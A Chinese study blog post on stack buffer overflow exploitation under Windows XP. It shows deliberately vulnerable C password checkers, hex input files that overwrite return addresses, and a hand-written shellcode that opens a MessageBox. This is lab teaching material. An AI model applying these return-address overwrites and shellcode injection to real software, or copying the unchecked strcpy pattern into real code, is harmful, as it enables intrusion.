---
title: 漏洞学习笔记-001-缓冲区溢出
description: 能够引起软件做一些超出涉及范围的事情的bug叫做漏洞，本篇写了一些简单的缓冲区溢出漏洞的利用浅析
date: 2020-10-18 10:00:00+0800
categories:
    - Exploit
tags:
    - Windows
    - Exploit
---

> - 功能性逻辑缺陷(Bug)
> - 安全性逻辑缺陷(Vulnerability)
>
> [点击此处下载本文附代码，可执行程序，shellcode文件](/assets/ExpStd/ExpStd01.zip)

本文来源：[Moeomu的博客](/zh-cn/posts/漏洞学习笔记-001-缓冲区溢出/)

## PE概念

### PE文件与虚拟内存之间的映射

- ImageBase：装载基址，对(.EXE)是0x00400000，对(.DLL)是0x10000000
- FileOffset：文件偏移地址
- VirtualAddress：虚拟地址，是映射到内存中的地址
- RelativeVirtualAddress：相对虚拟地址，是虚拟地址VA相对装载基址的偏移量

> VA = ImageBase + RVA

### 数据补全填充规则

- 在磁盘上时，PE文件的每个节(.section)是以0x200字节为单位存放，当节的大小不足0x200时，使用0x0补全，当节的大小超过0x200时，分配下一个0x200大小给此节
- 在内存中时，PE文件的每个节(.section)是以0x1000字节为单位存放，规则同上

> SectionOffset = RVA - FileOffset  
> FileOffset = VA - ImageBase - SectionOffset = RVA - SectionOffset  

> 例如.text节RVA=0x1000，FileOffset=0x400，则SectionOffset=0xC00  
> 0x00404141处指令文件偏移为0x00404141-0x00400000-(0x1000-0x400)=0x3541

### 函数调用约定

| | C | SysCall | StdCall | BASIC | FORTRAN | PASCAL
| - | - | - | - | - | - | - |
| 参数入栈顺序 | 右->左 | 右->左 | 右->左 | 左->右 | 左->右 | 左->右 |
| 恢复栈平衡的位置 | 母函数 | 子函数 | 子函数 | 子函数 | 子函数 | 子函数 |

### 缓冲区溢出

> 栈帧相邻，局部变量相邻，若数组越界，则会覆盖局部变量，接着覆盖函数返回地址  
> 通过淹没栈帧返回地址值以控制程序流程

---

## ShellCode

### Exploit/ShellCode(Payload)的分工合作

- Exploit的作用是精准利用某种漏洞，目标是劫持EIP
- ShellCode将执行恶意/善意代码，是攻击载荷
- ShellCode一般是通用的，Exploit只能针对某个特定的漏洞工作

### 实例

本例使用简单的密码验证来测试漏洞

---

#### 缓冲区溢出控制程序Flag

##### 代码(ExpStd0101)

> 编译环境：Windows XP SP3, Visual C++ 6, Debug  
> 实验环境：Windows XP SP3

```c
#include <stdio.h>
#include <string.h>
#define PASSWORD "1234567"

int verify_password(char *password)
{
    int authenticated;
    char buffer[8];
    authenticated = strcmp(password, PASSWORD);
    strcpy(buffer, password);
    return authenticated;
}

int main()
{
    int valid_flag = 0;
    char password[1024];
    while(1)
    {
        printf("Input Number:");
        scanf("%s", password);
        valid_flag = verify_password(password);
        if(valid_flag)
        {
            printf("ERROR!");
        }
        else
        {
            printf("OK!");
            break;
        }
    }
}
```

##### 分析(ExpStd0101)

- 简易分析  
  - 当输入99999999时，它的末尾`'\0'`将第9个字节填充，正好将authenticated的最低位1个字节0x1改为0x0  
  - 这也和strcmp函数有关系，如果`str1<str2`那authenticated的值-1以反码`FFFFFFFF`存储，此时即使将低位`FF`溢出为`00`也无用，所以并非全部的8位字符都可以绕过验证

- 进一步验证  
  - 当输入8个9时，8字节的buffer填满，覆盖1字节的authenticated空间  
  - 当输入11个9时，8字节的buffer填满，覆盖4字节的authenticated空间，即authenticated被完全覆盖，它被冲刷为`0x0039393939`  
  - 当输入15个9时，8字节的buffer填满，覆盖4字节的authenticated空间，本函数EBP所在空间也被覆盖(内容是父函数EBP)  
  - 当输入19个9时，8字节的buffer填满，覆盖4字节的authenticated空间，覆盖4字节的EBP空间，覆盖4字节的返回地址  

- 更进一步验证
  - 由于键盘无法输入一些不可见字符，所以更换为读取文件验证

---

#### 硬编码地址控制程序流程

使用FILE来进行文件的读取

##### 代码(ExpStd0102)

> 编译环境：Windows XP SP3, Visual C++ 6, Debug  
> 实验环境：Windows XP SP3

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#define PASSWORD "1234567"

int verify_password(char *password)
{
    int authenticated;
    char buffer[8];
    authenticated = strcmp(password, PASSWORD);
    strcpy(buffer, password);
    return authenticated;
}

int main()
{
    int valid_flag = 0;
    char password[1024];
    FILE * fp;
    if(!(fp = fopen("password.txt", "rw+")))
    {
        exit(0);
    }
    fscanf(fp, "%s", password);
    valid_flag = verify_password(password);
    if(valid_flag)
    {
        printf("ERROR!");
    }
    else
    {
        printf("OK!");
    }
    fclose(fp);
}

```

##### 分析(ExpStd0102)

> 首先使用已知的地址进行shellcode的编写，此地址不同编译器编译出的结果不同，不同系统加载的地址也不同，所以只能测试时使用

- 必要信息
  - 成功分支地址：`0x0040111F`
  - 由于内存逆序存放，应该逆序写这些值
- 十六进制编辑password.txt，如下

```c
34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31
1F 11 40 00
```

- 运行程序，此时
  - 在栈地址`0x0012FB24`处存放的事是函数`verify_password`的返回地址
  - 此处已经被冲刷为`0040111F`，而此地址是成功分支地址
- 使用成功分支地址替代了返回地址，但是由于堆栈不平衡，所以程序显示成功后崩溃

---

#### 加入攻击载荷(ShellCode)

加大了buffer的大小用来承载攻击载荷  
动态加载DLL用于调用API

##### 代码(ExpStd0103)

> 编译环境：Windows XP SP3, Visual C++ 6, Debug  
> 实验环境：Windows XP SP3

```c
#include <stdio.h>
#include <windows.h>
#define PASSWORD "1234567"

int verify_password(char *password)
{
    int authenticated;
    char buffer[44];
    authenticated = strcmp(password, PASSWORD);
    strcpy(buffer, password);
    return authenticated;
}

int main()
{
    int valid_flag = 0;
    char password[1024];
    FILE * fp;
    LoadLibrary("user32.dll");
    if(!(fp = fopen("password.txt", "rw+")))
    {
        exit(0);
    }
    fscanf(fp, "%s", password);
    valid_flag = verify_password(password);
    if(valid_flag)
    {
        printf("ERROR!");
    }
    else
    {
        printf("OK!");
    }
    fclose(fp);
}

```

##### 分析(ExpStd0103)

> 目标：在程序验证时植入代码，实现弹窗MessageBox

- 必要信息
  - 数组起始地址：`0x0012FAF0`(也是ShellCode执行的起始地址)
  - MessageBoxA地址：`0x77D507EC`
  - 十六进制的文字：`4D6F656F6D75`(Moeomuoo)
- 组成的机器码

| 机器码(HEX) | 汇编码 | 注释 |
| - | - | - |
| 33DB | XOR EBX, EBX | 清空EBX，保证ShellCode中无0(截至符)
| 53 | PUSH EBX | 字符串末尾的`\0`
| 68 6D756F6F | PUSH 6F6F756D | 压入文字字节muoo(0x6D756F6F)
| 68 4D6F656F | PUSH 6F656F4D | 压入文字字节Moeo(0x4D6F656F)
| 8BC4 | MOV EAX, ESP | ESP栈顶指向字符串Moeomuoo，移交给EAX
| 53 | PUSH EBX | MB_OK
| 50 | PUSH EAX | Message
| 50 | PUSH EAX | Caption
| 53 | PUSH EBX | Handle
| B8 EC07D577 | MOV EAX, 0x77D507EC | 将MessageBoxA的地址硬编码移入EAX
| FFD0 | CALL EAX | 调用MessageBoxA

- 将机器码按照顺序写入password.txt
  - 53-56字节填入返回地址(Buffer的起始地址)，其余字节用0x90填充
- 填充运行测试发现，最后只剩下2字节的空间可用，唯一不完美的地方在于程序崩溃退出

> 以下是最终的password.txt

```c
33 DB 53 68 6D 75 6F 6F  68 4D 6F 65 6F 8B C4 53
50 50 53 B8 EC 07 D5 77  FF D0 90 90 90 90 90 90
90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90
90 90 90 90 F0 FA 12 00
```

---

## 总结

本文讨论了如何利用缓冲区溢出漏洞以及ShellCode的编写，但不足之处在于硬编码地址和栈空间移位的问题  
有关这些问题下一篇讨论
